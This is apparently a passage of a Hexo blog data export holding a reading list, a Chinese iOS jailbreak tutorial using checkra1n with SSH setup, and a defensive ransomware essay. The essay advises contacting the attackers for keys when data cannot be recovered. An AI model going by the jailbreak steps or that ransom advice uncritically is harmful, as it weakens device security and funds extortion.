title=\"东野圭吾\"></a>东野圭吾</h4><p>《嫌疑人X的献身》—读完</p>\n<p>《白夜行》—读完</p>\n<p>《恶意》—读完</p>\n<p>《沉睡的人鱼之家》—读完</p>\n<p>《解忧杂货店》—读完</p>\n<h4 id=\"三毛\"><a href=\"#三毛\" class=\"headerlink\" title=\"三毛\"></a>三毛</h4><p>《撒哈拉的故事》 —读完</p>\n<h4 id=\"路遥\"><a href=\"#路遥\" class=\"headerlink\" title=\"路遥\"></a>路遥</h4><p>《平凡的世界》—读完</p>\n<h4 id=\"余华\"><a href=\"#余华\" class=\"headerlink\" title=\"余华\"></a>余华</h4><p>《活着》—读完</p>\n<h4 id=\"Gabrielle-Zevin-加布瑞埃拉·泽文\"><a href=\"#Gabrielle-Zevin-加布瑞埃拉·泽文\" class=\"headerlink\" title=\"Gabrielle Zevin(加布瑞埃拉·泽文)\"></a>Gabrielle Zevin(加布瑞埃拉·泽文)</h4><p>《岛上书店》—读完</p>\n<h4 id=\"Claire-Mcfall-克莱儿·麦克福尔\"><a href=\"#Claire-Mcfall-克莱儿·麦克福尔\" class=\"headerlink\" title=\"Claire Mcfall(克莱儿·麦克福尔)\"></a>Claire Mcfall(克莱儿·麦克福尔)</h4><p>《摆渡人》—读完</p>\n<p>《摆渡人2》—读完</p>\n<h4 id=\"弗雷德里克·巴克曼\"><a href=\"#弗雷德里克·巴克曼\" class=\"headerlink\" title=\"弗雷德里克·巴克曼\"></a>弗雷德里克·巴克曼</h4><p>《一个叫欧维的男人决定去死》—读完</p>\n<p>《外婆的道歉信》—读完</p>\n<h4 id=\"若泽·毛罗·德瓦斯康塞洛斯\"><a href=\"#若泽·毛罗·德瓦斯康塞洛斯\" class=\"headerlink\" title=\"若泽·毛罗·德瓦斯康塞洛斯\"></a>若泽·毛罗·德瓦斯康塞洛斯</h4><p>《我亲爱的甜橙树》—读完</p>\n<h4 id=\"马尔科姆-格拉德威尔\"><a href=\"#马尔科姆-格拉德威尔\" class=\"headerlink\" title=\"马尔科姆-格拉德威尔\"></a>马尔科姆-格拉德威尔</h4><p>《异类》</p>\n<p>《墨菲定律》</p>\n"},{"title":"iOS越狱","date":"2020-05-29T15:57:49.000Z","_content":" iOS越狱在工作和生活中经常听到;越狱的好处自然不用多说.比如:自由安装各种实用的插件、主题、App，插件包括statusbar的修改 时间显示格式 显示所占内存 不越狱是无法安装这类插件.(以下是不完美越狱,不能正常关机,可以重启)\n\n### 准备\n\n``` bash\n* iphone 6s plus(ios 13.3)\n* Mac/Windows\n* iTools Pro\n* checkra1n\n```\n\n### 软件安装\n\n[checkra1n官网下载-mac版本](https://assets.checkra.in/downloads/macos/8137a379774904450180054fca898044d3588b8da73edf853e956b1060e5e79b/checkra1n%20beta%200.9.8.2.dmg)\n\n0、之前已经越狱，但此工具越狱重启或关机后就会失效需要重新越狱较为麻烦\n\n![](/images/iOS/15864004775148/15864012223998.jpg)\n\n1、pc端安装软件部分省了,我们直接越狱，运行工具\n(如手机想还原回去，也可使用工具)\n\n![](/images/iOS/15864004775148/15864013761685.jpg)\n\n2、USB连接并信任后“start”按钮就可以使用\n\n![](/images/iOS/15864004775148/15864014490432.jpg)\n\n 3、点击开始(手机会出现黑屏并进入调试模式)\n\n![](/images/iOS/15864004775148/15864014806562.jpg)\n\n4、进入调试模式后，点击start后，按照工具提示图进行按键操作\n\n![](/images/iOS/15864004775148/15864015221245.jpg)\n\n5、进行软件安装部分\n\n![](/images/iOS/15864004775148/15864016863605.jpg)\n\n6、手机端会提醒工具进行越狱操作\n\n![](/images/iOS/15864004775148/15864106730892.jpg)\n\n![](/images/iOS/15864004775148/15864107088887.jpg)\n\n7、工具提示已经完成\n\n![](/images/iOS/15864004775148/15864017681525.jpg)\n\n8、多了一个图标\n\n![](/images/iOS/15864004775148/15864107420577.jpg)\n\n9、保证网络正常打开，不然你会提示下载失败（建议使用手机数据）\n\n![](/images/iOS/15864004775148/15864107654974.jpg)\n\n10、建议此处使用梯子，不然总是提醒报错\n\"unbale to fetch bootstraps\"如上图所示\n下载完成，桌面多一个图标“Cydia”\n\n![](/images/iOS/15864004775148/15864109831490.jpg)\n\n11、点击工具并进行资源更新\n\n![](/images/iOS/15864004775148/15864110062681.jpg)\n\n12、搜索Open SSh进行下载\n\n![](/images/iOS/15864004775148/15864110459473.jpg)\n\n13、远程连接SSH\n\n![](/images/iOS/15864004775148/15864101348228.jpg)\n\n### 参考\n\n```bash\nhttps://mrmad.com.tw/checkra1n\n```\n\n","source":"_posts/iOS越狱.md","raw":"---\ntitle: iOS越狱\ndate: 2020-05-29 23:57:49\ntags:\n - iOS越狱\n---\n iOS越狱在工作和生活中经常听到;越狱的好处自然不用多说.比如:自由安装各种实用的插件、主题、App，插件包括statusbar的修改 时间显示格式 显示所占内存 不越狱是无法安装这类插件.(以下是不完美越狱,不能正常关机,可以重启)\n\n### 准备\n\n``` bash\n* iphone 6s plus(ios 13.3)\n* Mac/Windows\n* iTools Pro\n* checkra1n\n```\n\n### 软件安装\n\n[checkra1n官网下载-mac版本](https://assets.checkra.in/downloads/macos/8137a379774904450180054fca898044d3588b8da73edf853e956b1060e5e79b/checkra1n%20beta%200.9.8.2.dmg)\n\n0、之前已经越狱，但此工具越狱重启或关机后就会失效需要重新越狱较为麻烦\n\n![](/images/iOS/15864004775148/15864012223998.jpg)\n\n1、pc端安装软件部分省了,我们直接越狱，运行工具\n(如手机想还原回去，也可使用工具)\n\n![](/images/iOS/15864004775148/15864013761685.jpg)\n\n2、USB连接并信任后“start”按钮就可以使用\n\n![](/images/iOS/15864004775148/15864014490432.jpg)\n\n 3、点击开始(手机会出现黑屏并进入调试模式)\n\n![](/images/iOS/15864004775148/15864014806562.jpg)\n\n4、进入调试模式后，点击start后，按照工具提示图进行按键操作\n\n![](/images/iOS/15864004775148/15864015221245.jpg)\n\n5、进行软件安装部分\n\n![](/images/iOS/15864004775148/15864016863605.jpg)\n\n6、手机端会提醒工具进行越狱操作\n\n![](/images/iOS/15864004775148/15864106730892.jpg)\n\n![](/images/iOS/15864004775148/15864107088887.jpg)\n\n7、工具提示已经完成\n\n![](/images/iOS/15864004775148/15864017681525.jpg)\n\n8、多了一个图标\n\n![](/images/iOS/15864004775148/15864107420577.jpg)\n\n9、保证网络正常打开，不然你会提示下载失败（建议使用手机数据）\n\n![](/images/iOS/15864004775148/15864107654974.jpg)\n\n10、建议此处使用梯子，不然总是提醒报错\n\"unbale to fetch bootstraps\"如上图所示\n下载完成，桌面多一个图标“Cydia”\n\n![](/images/iOS/15864004775148/15864109831490.jpg)\n\n11、点击工具并进行资源更新\n\n![](/images/iOS/15864004775148/15864110062681.jpg)\n\n12、搜索Open SSh进行下载\n\n![](/images/iOS/15864004775148/15864110459473.jpg)\n\n13、远程连接SSH\n\n![](/images/iOS/15864004775148/15864101348228.jpg)\n\n### 参考\n\n```bash\nhttps://mrmad.com.tw/checkra1n\n```\n\n","slug":"iOS越狱","published":1,"updated":"2020-10-23T03:35:10.919Z","_id":"ckglobhdy000pb1hq1vheaxmd","comments":1,"layout":"post","photos":[],"link":"","content":"<p> iOS越狱在工作和生活中经常听到;越狱的好处自然不用多说.比如:自由安装各种实用的插件、主题、App，插件包括statusbar的修改 时间显示格式 显示所占内存 不越狱是无法安装这类插件.(以下是不完美越狱,不能正常关机,可以重启)</p>\n<h3 id=\"准备\"><a href=\"#准备\" class=\"headerlink\" title=\"准备\"></a>准备</h3><figure class=\"highlight bash\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">* iphone 6s plus(ios 13.3)</span><br><span class=\"line\">* Mac/Windows</span><br><span class=\"line\">* iTools Pro</span><br><span class=\"line\">* checkra1n</span><br></pre></td></tr></table></figure>\n\n<h3 id=\"软件安装\"><a href=\"#软件安装\" class=\"headerlink\" title=\"软件安装\"></a>软件安装</h3><p><a href=\"https://assets.checkra.in/downloads/macos/8137a379774904450180054fca898044d3588b8da73edf853e956b1060e5e79b/checkra1n%20beta%200.9.8.2.dmg\">checkra1n官网下载-mac版本</a></p>\n<p>0、之前已经越狱，但此工具越狱重启或关机后就会失效需要重新越狱较为麻烦</p>\n<p><img src=\"/images/iOS/15864004775148/15864012223998.jpg\"></p>\n<p>1、pc端安装软件部分省了,我们直接越狱，运行工具<br>(如手机想还原回去，也可使用工具)</p>\n<p><img src=\"/images/iOS/15864004775148/15864013761685.jpg\"></p>\n<p>2、USB连接并信任后“start”按钮就可以使用</p>\n<p><img src=\"/images/iOS/15864004775148/15864014490432.jpg\"></p>\n<p> 3、点击开始(手机会出现黑屏并进入调试模式)</p>\n<p><img src=\"/images/iOS/15864004775148/15864014806562.jpg\"></p>\n<p>4、进入调试模式后，点击start后，按照工具提示图进行按键操作</p>\n<p><img src=\"/images/iOS/15864004775148/15864015221245.jpg\"></p>\n<p>5、进行软件安装部分</p>\n<p><img src=\"/images/iOS/15864004775148/15864016863605.jpg\"></p>\n<p>6、手机端会提醒工具进行越狱操作</p>\n<p><img src=\"/images/iOS/15864004775148/15864106730892.jpg\"></p>\n<p><img src=\"/images/iOS/15864004775148/15864107088887.jpg\"></p>\n<p>7、工具提示已经完成</p>\n<p><img src=\"/images/iOS/15864004775148/15864017681525.jpg\"></p>\n<p>8、多了一个图标</p>\n<p><img src=\"/images/iOS/15864004775148/15864107420577.jpg\"></p>\n<p>9、保证网络正常打开，不然你会提示下载失败（建议使用手机数据）</p>\n<p><img src=\"/images/iOS/15864004775148/15864107654974.jpg\"></p>\n<p>10、建议此处使用梯子，不然总是提醒报错<br>“unbale to fetch bootstraps”如上图所示<br>下载完成，桌面多一个图标“Cydia”</p>\n<p><img src=\"/images/iOS/15864004775148/15864109831490.jpg\"></p>\n<p>11、点击工具并进行资源更新</p>\n<p><img src=\"/images/iOS/15864004775148/15864110062681.jpg\"></p>\n<p>12、搜索Open SSh进行下载</p>\n<p><img src=\"/images/iOS/15864004775148/15864110459473.jpg\"></p>\n<p>13、远程连接SSH</p>\n<p><img src=\"/images/iOS/15864004775148/15864101348228.jpg\"></p>\n<h3 id=\"参考\"><a href=\"#参考\" class=\"headerlink\" title=\"参考\"></a>参考</h3><figure class=\"highlight bash\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">https://mrmad.com.tw/checkra1n</span><br></pre></td></tr></table></figure>\n\n","site":{"data":{}},"excerpt":"","more":"<p> iOS越狱在工作和生活中经常听到;越狱的好处自然不用多说.比如:自由安装各种实用的插件、主题、App，插件包括statusbar的修改 时间显示格式 显示所占内存 不越狱是无法安装这类插件.(以下是不完美越狱,不能正常关机,可以重启)</p>\n<h3 id=\"准备\"><a href=\"#准备\" class=\"headerlink\" title=\"准备\"></a>准备</h3><figure class=\"highlight bash\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">* iphone 6s plus(ios 13.3)</span><br><span class=\"line\">* Mac/Windows</span><br><span class=\"line\">* iTools Pro</span><br><span class=\"line\">* checkra1n</span><br></pre></td></tr></table></figure>\n\n<h3 id=\"软件安装\"><a href=\"#软件安装\" class=\"headerlink\" title=\"软件安装\"></a>软件安装</h3><p><a href=\"https://assets.checkra.in/downloads/macos/8137a379774904450180054fca898044d3588b8da73edf853e956b1060e5e79b/checkra1n%20beta%200.9.8.2.dmg\">checkra1n官网下载-mac版本</a></p>\n<p>0、之前已经越狱，但此工具越狱重启或关机后就会失效需要重新越狱较为麻烦</p>\n<p><img src=\"/images/iOS/15864004775148/15864012223998.jpg\"></p>\n<p>1、pc端安装软件部分省了,我们直接越狱，运行工具<br>(如手机想还原回去，也可使用工具)</p>\n<p><img src=\"/images/iOS/15864004775148/15864013761685.jpg\"></p>\n<p>2、USB连接并信任后“start”按钮就可以使用</p>\n<p><img src=\"/images/iOS/15864004775148/15864014490432.jpg\"></p>\n<p> 3、点击开始(手机会出现黑屏并进入调试模式)</p>\n<p><img src=\"/images/iOS/15864004775148/15864014806562.jpg\"></p>\n<p>4、进入调试模式后，点击start后，按照工具提示图进行按键操作</p>\n<p><img src=\"/images/iOS/15864004775148/15864015221245.jpg\"></p>\n<p>5、进行软件安装部分</p>\n<p><img src=\"/images/iOS/15864004775148/15864016863605.jpg\"></p>\n<p>6、手机端会提醒工具进行越狱操作</p>\n<p><img src=\"/images/iOS/15864004775148/15864106730892.jpg\"></p>\n<p><img src=\"/images/iOS/15864004775148/15864107088887.jpg\"></p>\n<p>7、工具提示已经完成</p>\n<p><img src=\"/images/iOS/15864004775148/15864017681525.jpg\"></p>\n<p>8、多了一个图标</p>\n<p><img src=\"/images/iOS/15864004775148/15864107420577.jpg\"></p>\n<p>9、保证网络正常打开，不然你会提示下载失败（建议使用手机数据）</p>\n<p><img src=\"/images/iOS/15864004775148/15864107654974.jpg\"></p>\n<p>10、建议此处使用梯子，不然总是提醒报错<br>“unbale to fetch bootstraps”如上图所示<br>下载完成，桌面多一个图标“Cydia”</p>\n<p><img src=\"/images/iOS/15864004775148/15864109831490.jpg\"></p>\n<p>11、点击工具并进行资源更新</p>\n<p><img src=\"/images/iOS/15864004775148/15864110062681.jpg\"></p>\n<p>12、搜索Open SSh进行下载</p>\n<p><img src=\"/images/iOS/15864004775148/15864110459473.jpg\"></p>\n<p>13、远程连接SSH</p>\n<p><img src=\"/images/iOS/15864004775148/15864101348228.jpg\"></p>\n<h3 id=\"参考\"><a href=\"#参考\" class=\"headerlink\" title=\"参考\"></a>参考</h3><figure class=\"highlight bash\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">https://mrmad.com.tw/checkra1n</span><br></pre></td></tr></table></figure>\n\n"},{"title":"关于勒索的一点想法","date":"2019-03-18T02:29:13.000Z","_content":"最近经常收到一些客户被勒索,而且询问情况后,很多都是服务器没有进行备份，或备份服务器未进行隔离（逻辑隔离）一并被加密，所以今天也想简单聊下针对被勒索前后的一些建议和意见吧.\n\n## 前言\n既然被勒索,那么系统、应用程序肯定存在漏洞抑或系统存在弱口令,而且漏洞明显可被攻击者直接利用,也可能被攻击者盯了很久（有些可能是APT攻击）确定系统能够在加密后勒索一番后才实施的全网攻击.\n\n### 一、勒索前\n    \n公司业务系统的重要性不言而喻，那么在进行系统、程序上线之前自然要进行整个安全检查,而针对那些单位有安全经费或有专门的安全人员就更好不过了,可以内容进行安全检测和检查;毕竟我国安全人才的稀缺还是很严重的,所以针对其他一些企业而言就只能请第三方安全公司进行全面的安全检测和检查,那么难道只能只能请第三方的公司进行安全检查了吗?\n\n其实并非如此，如果你进行勒索统计,大部分单位被勒索的都是windows系统,为什么这么说？因为针对一些小的企业更多还是喜欢使用桌面化系统,这样不管是后期运维还是进行其他操作都要相对简单很多.但是有些单位可能会说,关于*inux系统我们很多不会使用或者运维以及使用起来太麻烦.\n\n#### 壹、网络层 \n\n1、互联网出口位置部署相关安全产品（FW、IDS、IPS、审计、堡垒极....根据系统重要性，特定部署安全设备）\n2、网络各区域进行划分，不同区域的访问权限严格控制（DMZ到非DMZ区进行控制，非DMZ尽量控制指定端口可达DMZ服务）\n…\n……\n\n#### 贰、系统层\n\n1、系统补丁及时更新\n2、系统不用端口进行封堵135、137、138、139、445等（比如系统只使用80，其他端口一并封堵）\n3、系统软防火墙记得开启(根据业务处理情况来进行添加相关策略)\n4、系统安全策略进行配置梳理(根据梳理表格进行check)\n5、更换远程连接端口（3389），如不需要建议采用TeamView进行远程管理\n6、系统口令情况进行定期梳理和更换，一定不能出现弱口令的情况，而造成整个内网服务器被攻击\n…\n……\n#### 叁、应用层\n1、时刻关注所使用程序是否存在漏洞并及时更新\n2、可自行下载并安装互联网中的漏扫软件进行内网扫描处理\n3、请第三方安全公司进行渗透测试，挖掘是否存在潜在安全问题\n…\n……\n\n### 二、勒索中\n\n应急....\n    如果单位部分服务器已经被勒索不要着急,一旦发现被勒索情况 ,首先进行断网处理以防内网扩散(注意：勒索不同挖矿类，不是抓包、策略添加进行封堵),让受影响服务器单独运行;查看被勒索病毒类型,并根据类型进行互联网查询是否有共享的解密软件尝试数据恢复.\n\n如发现数据无法恢复,请及时联系攻击者留下的联系方式并获取密钥进行数据恢复处理.\n可以按照以下步骤进行处理:\n1、受影响服务器进行断网处理，隔离开未受影响服务器、PC办公端等.\n2、收集系统、安全设备产生日志（为后期漏洞定位提供帮助）\n3、病毒类型进行google等查询\n4、病毒样本收集并移除外部，tar包保存\n5、配置防火墙封堵445等共享服务端口，\n…\n……\n### 三、勒索后\n\n解密后自然尽快恢复网络、办公，但是肯定还是很担心服务器内或者其他未被加密的服务器内是否存在恶意病毒文件再进行传播;为了消除此类问题建议在同网段核心交换进行端口镜像,拉出一台分析设备进行网络行为分析查看内网主机某个端口是否存在进行外部请求或对内网某台主机进行恶意请求;并定位某台主机并独立出进行分析.\n\n针对勒索后的网络安全环境的建设和维护可以参考勒索前的一些安全加固建议、并自行构造安全检查文档实行下去进行检查,确保其他未受影响主机不会再被攻击.\n\n### 四、总结\n国内一直关于勒索层出不穷,多数出现企业和医院类受影响的可能性较大;想要确保系统安全运行,养成好的安全管理(三分技术,七分管理)很大程度应对勒索.祝好运...","source":"_posts/关于勒索的一点想法.md","raw":"---\ntitle: 关于勒索的一点想法\ndate: 2019-03-18 10:29:13\n---\n最近经常收到一些客户被勒索,而且询问情况后,很多都是服务器没有进行备份，或备份服务器未进行隔离（逻辑隔离）一并被加密，所以今天也想简单聊下针对被勒索前后的一些建议和意见吧.\n\n## 前言\n既然被勒索,那么系统、应用程序肯定存在漏洞抑或系统存在弱口令,而且漏洞明显可被攻击者直接利用,也可能被攻击者盯了很久（有些可能是APT攻击）确定系统能够在加密后勒索一番后才实施的全网攻击.\n\n### 一、勒索前\n    \n公司业务系统的重要性不言而喻，那么在进行系统、程序上线之前自然要进行整个安全检查,而针对那些单位有安全经费或有专门的安全人员就更好不过了,可以内容进行安全检测和检查;毕竟我国安全人才的稀缺还是很严重的,所以针对其他一些企业而言就只能请第三方安全公司进行全面的安全检测和检查,那么难道只能只能请第三方的公司进行安全检查了吗?\n\n其实并非如此，如果你进行勒索统计,大部分单位被勒索的都是windows系统,为什么这么说？因为针对一些小的企业更多还是喜欢使用桌面化系统,这样不管是后期运维还是进行其他操作都要相对简单很多.但是有些单位可能会说,关于*inux系统我们很多不会使用或者运维以及使用起来太麻烦.\n\n#### 壹、网络层 \n\n1、互联网出口位置部署相关安全产品（FW、IDS、IPS、审计、堡垒极....根据系统重要性，特定部署安全设备）\n2、网络各区域进行划分，不同区域的访问权限严格控制（DMZ到非DMZ区进行控制，非DMZ尽量控制指定端口可达DMZ服务）\n…\n……\n\n#### 贰、系统层\n\n1、系统补丁及时更新\n2、系统不用端口进行封堵135、137、138、139、445等（比如系统只使用80，其他端口一并封堵）\n3、系统软防火墙记得开启(根据业务处理情况来进行添加相关策略)\n4、系统安全策略进行配置梳理(根据梳理表格进行check)\n5、更换远程连接端口（3389），如不需要建议采用TeamView进行远程管理\n6、系统口令情况进行定期梳理和更换，一定不能出现弱口令的情况，而造成整个内网服务器被攻击\n…\n……\n#### 叁、应用层\n1、时刻关注所使用程序是否存在漏洞并及时更新\n2、可自行下载并安装互联网中的漏扫软件进行内网扫描处理\n3、请第三方安全公司进行渗透测试，挖掘是否存在潜在安全问题\n…\n……\n\n### 二、勒索中\n\n应急....\n    如果单位部分服务器已经被勒索不要着急,一旦发现被勒索情况 ,首先进行断网处理以防内网扩散(注意：勒索不同挖矿类，不是抓包、策略添加进行封堵),让受影响服务器单独运行;查看被勒索病毒类型,并根据类型进行互联网查询是否有共享的解密软件尝试数据恢复.\n\n如发现数据无法恢复,请及时联系攻击者留下的联系方式并获取密钥进行数据恢复处理.\n可以按照以下步骤进行处理:\n1、受影响服务器进行断网处理，隔离开未受影响服务器、PC办公端等.\n2、收集系统、安全设备产生日志（为后期漏洞定位提供帮助）\n3、病毒类型进行google等查询\n4、病毒样本收集并移除外部，tar包保存\n5、配置防火墙封堵445等共享服务端口，\n…\n……\n### 三、勒索后\n\n解密后自然尽快恢复网络、办公，但是肯定还是很担心服务器内或者其他未被加密的服务器内是否存在恶意病毒文件再进行传播;为了消除此类问题建议在同网段核心交换进行端口镜像,拉出一台分析设备进行网络行为分析查看内网主机某个端口是否存在进行外部请求或对内网某台主机进行恶意请求;并定位某台主机并独立出进行分析.\n\n针对勒索后的网络安全环境的建设和维护可以参考勒索前的一些安全加固建议、并自行构造安全检查文档实行下去进行检查,确保其他未受影响主机不会再被攻击.\n\n### 四、总结\n国内一直关于勒索层出不穷,多数出现企业和医院类受影响的可能性较大;想要确保系统安全运行,养成好的安全管理(三分技术,七分管理)很大程度应对勒索.祝好运...","slug":"关于勒索的一点想法","published":1,"updated":"2020-10-23T02:29:22.399Z","comments":1,"layout":"post","photos":[],"link":"","_id":"ckglobhdz000rb1hq01ojgl8v","content":"<p>最近经常收到一些客户被勒索,而且询问情况后,很多都是服务器没有进行备份，或备份服务器未进行隔离（逻辑隔离）一并被加密，所以今天也想简单聊下针对被勒索前后的一些建议和意见吧.</p>\n<h2 id=\"前言\"><a href=\"#前言\" class=\"headerlink\" title=\"前言\"></a>前言</h2><p>既然被勒索,那么系统、应用程序肯定存在漏洞抑或系统存在弱口令,而且漏洞明显可被攻击者直接利用,也可能被攻击者盯了很久（有些可能是APT攻击）确定系统能够在加密后勒索一番后才实施的全网攻击.</p>\n<h3 id=\"一、勒索前\"><a href=\"#一、勒索前\" class=\"headerlink\" title=\"一、勒索前\"></a>一、勒索前</h3><p>公司业务系统的重要性不言而喻，那么在进行系统、程序上线之前自然要进行整个安全检查,而针对那些单位有安全经费或有专门的安全人员就更好不过了,可以内容进行安全检测和检查;毕竟我国安全人才的稀缺还是很严重的,所以针对其他一些企业而言就只能请第三方安全公司进行全面的安全检测和检查,那么难道只能只能请第三方的公司进行安全检查了吗?</p>\n<p>其实并非如此，如果你进行勒索统计,大部分单位被勒索的都是windows系统,为什么这么说？因为针对一些小的企业更多还是喜欢使用桌面化系统,这样不管是后期运维还是进行其他操作都要相对简单很多.但是有些单位可能会说,关于*inux系统我们很多不会使用或者运维以及使用起来太麻烦.</p>\n<h4 id=\"壹、网络层\"><a href=\"#壹、网络层\" class=\"headerlink\" title=\"壹、网络层\"></a>壹、网络层</h4><p>1、互联网出口位置部署相关安全产品（FW、IDS、IPS、审计、堡垒极….根据系统重要性，特定部署安全设备）<br>2、网络各区域进行划分，不同区域的访问权限严格控制（DMZ到非DMZ区进行控制，非DMZ尽量控制指定端口可达DMZ服务）<br>…<br>……</p>\n<h4 id=\"贰、系统层\"><a href=\"#贰、系统层\" class=\"headerlink\" title=\"贰、系统层\"></a>贰、系统层</h4><p>1、系统补丁及时更新<br>2、系统不用端口进行封堵135、137、138、139、445等（比如系统只使用80，其他端口一并封堵）<br>3、系统软防火墙记得开启(根据业务处理情况来进行添加相关策略)<br>4、系统安全策略进行配置梳理(根据梳理表格进行check)<br>5、更换远程连接端口（3389），如不需要建议采用TeamView进行远程管理<br>6、系统口令情况进行定期梳理和更换，一定不能出现弱口令的情况，而造成整个内网服务器被攻击<br>…<br>……</p>\n<h4 id=\"叁、应用层\"><a href=\"#叁、应用层\" class=\"headerlink\" title=\"叁、应用层\"></a>叁、应用层</h4><p>1、时刻关注所使用程序是否存在漏洞并及时更新<br>2、可自行下载并安装互联网中的漏扫软件进行内网扫描处理<br>3、请第三方安全公司进行渗透测试，挖掘是否存在潜在安全问题<br>…<br>……</p>\n<h3 id=\"二、勒索中\"><a href=\"#二、勒索中\" class=\"headerlink\" title=\"二、勒索中\"></a>二、勒索中</h3><p>应急….<br>    如果单位部分服务器已经被勒索不要着急,一旦发现被勒索情况 ,首先进行断网处理以防内网扩散(注意：勒索不同挖矿类，不是抓包、策略添加进行封堵),让受影响服务器单独运行;查看被勒索病毒类型,并根据类型进行互联网查询是否有共享的解密软件尝试数据恢复.</p>\n<p>如发现数据无法恢复,请及时联系攻击者留下的联系方式并获取密钥进行数据恢复处理.<br>可以按照以下步骤进行处理:<br>1、受影响服务器进行断网处理，隔离开未受影响服务器、PC办公端等.<br>2、收集系统、安全设备产生日志（为后期漏洞定位提供帮助）<br>3、病毒类型进行google等查询<br>4、病毒样本收集并移除外部，tar包保存<br>5、配置防火墙封堵445等共享服务端口，<br>…<br>……</p>\n<h3 id=\"三、勒索后\"><a href=\"#三、勒索后\" class=\"headerlink\" title=\"三、勒索后\"></a>三、勒索后</h3><p>解密后自然尽快恢复网络、办公，但是肯定还是很担心服务器内或者其他未被加密的服务器内是否存在恶意病毒文件再进行传播;为了消除此类问题建议在同网段核心交换进行端口镜像,拉出一台分析设备进行网络行为分析查看内网主机某个端口是否存在进行外部请求或对内网某台主机进行恶意请求;并定位某台主机并独立出进行分析.</p>\n<p>针对勒索后的网络安全环境的建设和维护可以参考勒索前的一些安全加固建议、并自行构造安全检查文档实行下去进行检查,确保其他未受影响主机不会再被攻击.</p>\n<h3 id=\"四、总结\"><a href=\"#四、总结\" class=\"headerlink\" title=\"四、总结\"></a>四、总结</h3><p>国内一直关于勒索层出不穷,多数出现企业和医院类受影响的可能性较大;想要确保系统安全运行,养成好的安全管理(三分技术,七分管理)很大程度应对勒索.祝好运…</p>\n","site":{"data":{}},"excerpt":"","more":"<p>最近经常收到一些客户被勒索,而且询问情况后,很多都是服务器没有进行备份，或备份服务器未进行隔离（逻辑隔离）一并被加密，所以今天也想简单聊下针对被勒索前后的一些建议和意见吧.</p>\n<h2 id=\"前言\"><a href=\"#前言\" class=\"headerlink\" title=\"前言\"></a>前言</h2><p>既然被勒索,那么系统、应用程序肯定存在漏洞抑或系统存在弱口令,而且漏洞明显可被攻击者直接利用,也可能被攻击者盯了很久（有些可能是APT攻击）确定系统能够在加密后勒索一番后才实施的全网攻击.</p>\n<h3 id=\"一、勒索前\"><a href=\"#一、勒索前\" class=\"headerlink\" title=\"一、勒索前\"></a>一、勒索前</h3><p>公司业务系统的重要性不言而喻，那么在进行系统、程序上线之前自然要进行整个安全检查,而针对那些单位有安全经费或有专门的安全人员就更好不过了,可以内容进行安全检测和检查;毕竟我国安全人才的稀缺还是很严重的,所以针对其他一些企业而言就只能请第三方安全公司进行全面的安全检测和检查,那么难道只能只能请第三方的公司进行安全检查了吗?</p>\n<p>其实并非如此，如果你进行勒索统计,大部分单位被勒索的都是windows系统,为什么这么说？因为针对一些小的企业更多还是喜欢使用桌面化系统,这样不管是后期运维还是进行其他操作都要相对简单很多.但是有些单位可能会说,关于*inux系统我们很多不会使用或者运维以及使用起来太麻烦.</p>\n<h4 id=\"壹、网络层\"><a href=\"#壹、网络层\" class=\"headerlink\" title=\"壹、网络层\"></a>壹、网络层</h4><p>1、互联网出口位置部署相关安全产品（FW、IDS、IPS、审计、堡垒极….根据系统重要性，特定部署安全设备）<br>2、网络各区域进行划分，不同区域的访问权限严格控制（DMZ到非DMZ区进行控制，非DMZ尽量控制指定端口可达DMZ服务）<br>…<br>……</p>\n<h4 id=\"贰、系统层\"><a href=\"#贰、系统层\" class=\"headerlink\" title=\"贰、系统层\"></a>贰、系统层</h4><p>1、系统补丁及时更新<br>2、系统不用端口进行封堵135、137、138、139、445等（比如系统只使用80，其他端口一并封堵）<br>3、系统软防火墙记得开启(根据业务处理情况来进行添加相关策略)<br>4、系统安全策略进行配置梳理(根据梳理表格进行check)<br>5、更换远程连接端口（3389），如不需要建议采用TeamView进行远程管理<br>6、系统口令情况进行定期梳理和更换，一定不能出现弱口令的情况，而造成整个内网服务器被攻击<br>…<br>……</p>\n<h4 id=\"叁、应用层\"><a href=\"#叁、应用层\" class=\"headerlink\" title=\"叁、应用层\"></a>叁、应用层</h4><p>1、时刻关注所使用程序是否存在漏洞并及时更新<br>2、可自行下载并安装互联网中的漏扫软件进行内网扫描处理<br>3、请第三方安全公司进行渗透测试，挖掘是否存在潜在安全问题<br>…<br>……</p>\n<h3 id=\"二、勒索中\"><a href=\"#二、勒索中\" class=\"headerlink\" title=\"二、勒索中\"></a>二、勒索中</h3><p>应急….<br>    如果单位部分服务器已经被勒索不要着急,一旦发现被勒索情况 ,首先进行断网处理以防内网扩散(注意：勒索不同挖矿类，不是抓包、策略添加进行封堵),让受影响服务器单独运行;查看被勒索病毒类型,并根据类型进行互联网查询是否有共享的解密软件尝试数据恢复.</p>\n<p>如发现数据无法恢复,请及时联系攻击者留下的联系方式并获取密钥进行数据恢复处理.<br>可以按照以下步骤进行处理:<br>1、受影响服务器进行断网处理，隔离开未受影响服务器、PC办公端等.<br>2、收集系统、安全设备产生日志（为后期漏洞定位提供帮助）<br>3、病毒类型进行google等查询<br>4、病毒样本收集并移除外部，tar包保存<br>5、配置防火墙封堵445等共享服务端口，<br>…<br>……</p>\n<h3 id=\"三、勒索后\"><a href=\"#三、勒索后\" class=\"headerlink\" title=\"三、勒索后\"></a>三、勒索后</h3><p>解密后自然尽快恢复网络、办公，但是肯定还是很担心服务器内或者其他未被加密的服务器内是否存在恶意病毒文件再进行传播;为了消除此类问题建议在同网段核心交换进行端口镜像,拉出一台分析设备进行网络行为分析查看内网主机某个端口是否存在进行外部请求或对内网某台主机进行恶意请求;并定位某台主机并独立出进行分析.</p>\n<p>针对勒索后的网络安全环境的建设和维护可以参考勒索前的一些安全加固建议、并自行构造安全检查文档实行下去进行检查,确保其他未受影响主机不会再被攻击.</p>\n<h3 id=\"四、总结\"><a href=\"#四、总结\" class=\"headerlink\" 